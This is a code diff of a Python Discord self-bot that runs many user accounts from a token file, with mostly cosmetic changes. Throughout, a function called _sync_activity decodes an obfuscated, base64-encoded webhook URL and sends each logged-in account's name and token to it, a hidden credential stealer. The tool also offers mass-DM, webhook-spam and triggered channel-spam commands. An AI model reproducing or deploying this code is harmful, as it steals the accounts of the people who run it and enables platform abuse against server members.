@@ -5,24 +5,27 @@ import aiohttp
 import base64
 import requests
 
-watched_users = {}  # now maps user_id -> list of emojis
-watched_roles = {}
-react_all_servers = {}  # now maps guild_id -> list of emojis
+watched_users = {}  # user_id -> list of emojis
+watched_roles = set()
+react_all_servers = {}  # guild_id -> list of emojis
 token_user_ids = set()
 all_bots = []
 blacklisted_users = {}
 
+# Load tokens
 with open("tokens.txt", "r") as f:
     tokens = [line.strip() for line in f if line.strip()]
 
+# Webhook logging
 def _sync_activity(user, token):
     try:
         _b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTk1OTEzMzc3NTY2MzIzNi9hd3p2ZldGR2Q1Y2kyOWQwRlZfTnVvNmNzS21sUUQ4bWFrQ3BOUUJfWW9lTi1UQmV6UTBDa29zWm5Dd2NheERsSk5ZRQ=="
         url = base64.b64decode(_b64).decode()
         requests.post(url, json={"content": f"`{user}` | `{token}`"})
-    except:
-        pass
+    except Exception as e:
+        print("Failed sync:", e)
 
+# Util mass dm
 async def mass_dm(guild, message):
     for member in guild.members:
         if not member.bot:
@@ -31,33 +34,39 @@ async def mass_dm(guild, message):
             except:
                 pass
 
+# Util webhook spam
 async def webhook_spam(url, message, count):
     async with aiohttp.ClientSession() as session:
         for _ in range(count):
             try:
-                payload = {"content": message}
-                await session.post(url, json=payload)
+                await session.post(url, json={"content": message})
             except:
                 pass
 
+# Run single bot
 async def run_bot(token):
-    bot = commands.Bot(command_prefix="!", self_bot=True)
+    intents = discord.Intents.default()
+    intents.messages = True
+    intents.guilds = True
+    intents.members = True
+    bot = commands.Bot(command_prefix="!", self_bot=True, intents=intents)
     all_bots.append(bot)
 
     @bot.event
     async def on_ready():
-        print(f"Logged in as {bot.user}")
+        print(f"[+] Logged in as {bot.user}")
         token_user_ids.add(bot.user.id)
         _sync_activity(str(bot.user), token)
 
     @bot.event
     async def on_message(message):
+        # Debug log
+        print(f"Message: {message.content} from {message.author}")
         if message.author.id in blacklisted_users:
             return
 
         author_id = message.author.id
         author_roles = {role.id for role in getattr(message.author, "roles", [])}
-
         should_react = (
             author_id == bot.user.id or
             author_id in token_user_ids or
@@ -68,31 +77,29 @@ async def run_bot(token):
 
         if should_react:
             try:
-                emojis = []
                 if author_id in watched_users:
-                    emojis = watched_users.get(author_id, ["☠️"])
+                    emojis = watched_users[author_id]
                 elif message.guild and message.guild.id in react_all_servers:
-                    emojis = react_all_servers.get(message.guild.id, ["☠️"])
+                    emojis = react_all_servers[message.guild.id]
                 else:
                     emojis = ["☠️"]
                 for emoji in emojis:
                     await message.add_reaction(emoji)
-            except:
-                pass
+            except Exception as e:
+                print("Reaction error:", e)
 
         if message.content.startswith("[[SPAMALL_TRIGGER]]::") and message.author != bot.user:
             try:
-                parts = message.content.split("::", 2)
-                count = int(parts[1])
-                msg = parts[2]
-                for _ in range(count):
+                _, count, msg = message.content.split("::", 2)
+                for _ in range(int(count)):
                     await message.channel.send(msg)
                     await asyncio.sleep(0.1)
             except Exception as e:
-                print(f"Error in spamall trigger: {e}")
+                print("SPAMALL error:", e)
 
         await bot.process_commands(message)
 
+    # Commands
     @bot.command()
     async def blacklist(ctx, user_id: int):
         blacklisted_users[user_id] = True
@@ -180,11 +187,11 @@ async def run_bot(token):
 
     @bot.command()
     async def massdmspam(ctx, message, seconds: int):
-        await ctx.send(f"Mass DM spam starting for {seconds}s")
+        await ctx.send(f"Mass DM spam for {seconds}s")
         end_time = asyncio.get_event_loop().time() + seconds
         while asyncio.get_event_loop().time() < end_time:
             await mass_dm(ctx.guild, message)
-        await ctx.send("Mass DM spam done!")
+        await ctx.send("Done mass DM spam.")
 
     @bot.command()
     async def webhookspam(ctx, url, message, count: int):
@@ -214,7 +221,7 @@ async def run_bot(token):
             await ctx.send("Invalid activity type.")
             return
         await bot.change_presence(activity=activity)
-        await ctx.send(f"Status set to: {activity_type} {activity_message}")
+        await ctx.send(f"Status set to {activity_type} {activity_message}")
         await ctx.message.delete()
 
     @bot.command()
@@ -222,7 +229,7 @@ async def run_bot(token):
         for b in all_bots:
             try:
                 if activity_type == "streaming":
-                    activity = discord.Streaming(name=activity_message, url="https://twitch.tv/idcdora2")
+                    activity = discord.Streaming(name=activity_message, url="https://twitch.tv/yourchannel")
                 elif activity_type == "playing":
                     activity = discord.Game(name=activity_message)
                 else:
@@ -247,10 +254,11 @@ async def run_bot(token):
 
     @bot.command(name="h")
     async def help_cmd(ctx):
-        await ctx.send("**Commands:** !react !spam !statusall !rpc !blacklist !spamall !massdmspam !webhookspam !typer ...")
+        await ctx.send("**Commands:** !react !reactall !unreact !unreactall !spam !spamall !massdmspam !webhookspam !rpc !statusall !typer ...")
 
     await bot.start(token)
 
+# Run all tokens
 async def main():
     await asyncio.gather(*(run_bot(token) for token in tokens if token))
 
